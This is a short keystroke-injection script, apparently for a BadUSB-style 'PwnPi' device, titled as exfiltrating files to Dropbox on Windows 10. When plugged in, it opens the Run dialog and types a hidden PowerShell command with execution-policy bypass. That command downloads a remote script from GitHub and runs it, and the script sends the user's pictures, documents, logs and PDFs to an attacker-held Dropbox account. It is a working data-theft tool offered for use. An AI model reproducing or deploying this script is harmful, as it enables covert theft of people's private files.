// Title: beigeworm's Exfiltrate files to Dropbox
// Author: @beigeworm
// Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
// Target: Windows 10
// *SETUP*
// replace DROPBOX_TOKEN with your Dropbox Token.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $db='DROPBOX_TOKEN'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-Dropbox/main.ps1 | iex");
delay(500);
press("ENTER");
